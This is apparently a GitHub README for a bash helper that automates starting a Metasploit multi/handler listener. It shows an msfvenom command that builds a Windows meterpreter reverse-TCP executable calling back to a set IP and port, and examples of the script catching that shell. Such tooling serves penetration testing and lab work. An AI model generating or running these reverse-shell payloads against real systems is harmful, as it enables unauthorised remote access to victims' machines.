# MultiHandler
Too lazy to start meterpreter, search for the multi handler, use it, set the payload, set the lhost, set the lport and then run it? .. takes a while, lots of things to type. No More!   

Copy and paste your payload, IP and Port from the msfvenom command and execute it.

## Example

Let's say you ran this msfvenom command to generate an executable binary for a reverse shell:  

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.41 LPORT=1338 -f exe -o lazy.exe
```
![image](https://github.com/LazyTitan33/MultiHandler/assets/80063008/0dd82f56-f509-4352-ad9f-a710e7e042b5)

You would then normally need to:
1. start Meterpreter
2. search for the multi handler
3. use it
4. set the payload
5. set the lhost
6. set the lport
7. execute it.

Those are a lot of steps and typing or copying and pasting. How about you run this script with the above highlighted part of the msfvenom command copied and pasted?

```bash
./MultiHandler.sh windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.41 LPORT=1337
```
![image](https://github.com/LazyTitan33/MultiHandler/assets/80063008/2902c146-4fb2-4e62-893a-a5f7e70e8829)

You can also simply type (if you are into that sort of thing) the payload, IP and Port manually and it will work just the same.

```bash
./MultiHandler.sh windows/x64/meterpreter/reverse_tcp 10.10.16.41 1337
```

![image](https://github.com/LazyTitan33/MultiHandler/assets/80063008/38f89ab5-708b-4ed0-8565-01697b509238)

This quick bash script generates and runs a [Meterpreter Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) that you can keep using or again, very simply generate another one for a different port if you want.
